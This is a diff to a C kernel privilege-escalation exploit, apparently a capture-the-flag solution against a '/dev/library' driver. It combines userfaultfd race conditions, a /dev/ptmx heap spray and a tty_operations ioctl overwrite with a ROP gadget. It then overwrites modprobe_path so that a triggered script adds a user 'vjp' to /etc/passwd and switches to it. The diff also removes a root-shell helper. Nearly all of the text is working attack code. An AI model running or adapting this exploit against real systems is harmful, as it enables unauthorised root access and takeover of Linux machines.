@@ -25,48 +25,26 @@
 #include "tty.h"
 
 #define PAGE_SIZE 0x1000
+
 #define logInfo(...) do{ \
     fprintf(stderr,"[*] "); \
     fprintf(stderr,__VA_ARGS__); \
     fputc('\n',stderr); \
 }while(0)
+
 #define logErr(...) do{ \
     fprintf(stderr,"[!] "); \
     fprintf(stderr,__VA_ARGS__); \
     fputc('\n',stderr); \
 }while(0)
+
 #define errExit(...) do{ \
     logErr(__VA_ARGS__); \
     fprintf(stderr,": %s",strerror(errno)); \
     exit(-1); \
 }while(0)
-u_int64_t user_ip;
-u_int64_t user_cs;
-u_int64_t user_rflags;
-u_int64_t user_sp;
-u_int64_t user_ss;
-void get_shell(){
-    if(getuid()){
-        logErr("NO ROOT");
-    }
-    logInfo("Rooted!");
-    char *argv[]={"/bin/sh",NULL};
-    char *envp[]={NULL};
-    execve(argv[0],argv,envp);
-}
-void save_state(){
-    __asm__(
-        ".intel_syntax noprefix;"
-        "mov user_cs, cs;"
-        "mov user_ss, ss;"
-        "mov user_sp, rsp;"
-        "pushf;"
-        "pop user_rflags;"
-        ".att_syntax;"
-    );
-    user_ip = get_shell;
-    logInfo("Saved user state");
-}
+
+
 #define DEVICE_FILE "/dev/library"
 
 #define BOOK_DESCRIPTION_SIZE 0x300
@@ -151,9 +129,10 @@ void stage2(){
     }
 
     memcpy(uf_buffer,(void *)0x1337000,0x18);
-    *(uint64_t *)&uf_buffer[offsetof(struct tty_operations,ioctl)] = _text + 0x13e9b1; // mov DWORD PTR [rdx],esi ; ret
     *(uint64_t *)&uf_buffer[0x18] = heap_addr;
-
+    ((struct tty_operations *)uf_buffer)->ioctl = _text + 0x13e9b1; // mov dword ptr [rdx] , esi ; ret
+   
+    
     if( ( ptmx_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY) ) == -1 )
         errExit("ptmx spray");
     
@@ -168,6 +147,7 @@ int main(int argc,char** argv,char** envp){
     add_book(0);
     register_ufd(0x1337000);
     pthread_create(&th, NULL, (void *)race_userfault, stage1);
+    sleep(3);
     get_book_description(0,(void *)0x1337000);
 
     char* leaker = (void *)0x1337000;
@@ -182,6 +162,7 @@ int main(int argc,char** argv,char** envp){
     add_book(0);
     register_ufd(0x1338000);
     pthread_create(&th, NULL, (void *)race_userfault, stage2);
+    sleep(3);
     add_book_description(0,(void *)0x1338000);
 
     uint32_t* inject = (uint32_t *)"/tmp/vjp\0";
@@ -200,6 +181,4 @@ int main(int argc,char** argv,char** envp){
     system("/tmp/pwn");  // trigger call modprobe_path
     system("grep vjp /etc/passwd" );
     system("su vjp");
-
-
 }
